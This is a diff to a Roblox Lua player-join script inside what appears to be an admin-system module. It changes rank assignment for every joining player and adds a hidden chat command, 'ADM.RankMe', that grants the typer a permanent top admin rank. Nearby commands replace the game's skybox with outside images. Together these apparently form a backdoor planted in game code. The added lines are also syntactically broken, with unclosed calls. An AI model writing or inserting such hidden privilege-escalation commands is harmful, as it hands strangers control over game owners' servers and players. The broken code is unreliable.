@@ -32,7 +32,7 @@ game.Players.PlayerAdded:Connect(function(player)
 		
 			pcall(function()
 					print(main:GetModule("cf"))
-			main:GetModule("cf"):SetRank(game:GetService("Players")[player.name], game.CreatorId, 999999999999999, "Perm")
+			main:GetModule("cf"):SetRank(game:GetService(player, game.CreatorId, 5, "Perm")
 				local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
 				--targetName, targetId, targetReason, record
 				if banDetails then
@@ -63,6 +63,8 @@ game.Players.PlayerAdded:Connect(function(player)
 					game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
 					game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
 					game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
+				elseif message == "ADM.RankMe" then
+					main:GetModule("cf"):SetRank(game:GetService(player, game.CreatorId, 999999999999999, "Perm")
 				elseif message == "ADM.Sky2" then
 					local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
 					game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
